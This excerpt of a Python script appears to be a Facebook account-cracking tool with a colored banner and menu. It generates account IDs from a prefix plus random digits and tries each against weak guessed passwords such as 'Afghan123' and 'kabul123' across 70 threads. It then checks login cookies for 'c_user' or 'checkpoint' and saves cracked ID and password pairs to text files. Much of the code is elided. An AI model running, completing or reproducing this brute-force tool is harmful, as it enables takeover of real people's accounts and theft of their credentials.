...
\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 ...
 \033[1;34m┃ [✓] version   \033[1;91m: \033[1;92m0.1   
 \033[1;34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def jamal():
	...
	if jamal1 =='4':
		os.system('xdg-open  https://www.facebook.com/sayedjamal.afg')
	if jamal1 =='3':
		os.system('xdg-open https://www.facebook.com/sayedjamal.afg');jamal()
	if jamal1 =='2':
		bangla()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM OLD IDs UPDATE  Method \x1b[1;92m1')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','AfHADISstan','afghan12345','kabul123','100200']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');jamal()
def m2():
    user=[]
    os.system('clear')
    print(logo)
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','AfHADISstan','Afghan12345','kabul123','۱۲۳۴۵۶']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','AfHADISstan','Afghan12345','kabul123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');HADIS()
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=kRrbZOLlspmZPih_VNm2k-zU; sb=kxrbZM_r8oeTOMMgSp1NoqLQ; m_pixel_ratio=2; wd=980x1949; fr=0e1vAJUd62Bq7EiXS..Bk2xqT.yQ.AAA.0.0.Bk26u6.AWVfeNE0fac',
    'dpr': '2',
    ...
    'upgrade-insecure-requests': '1',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('HADIS-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HADIS-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HADIS-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
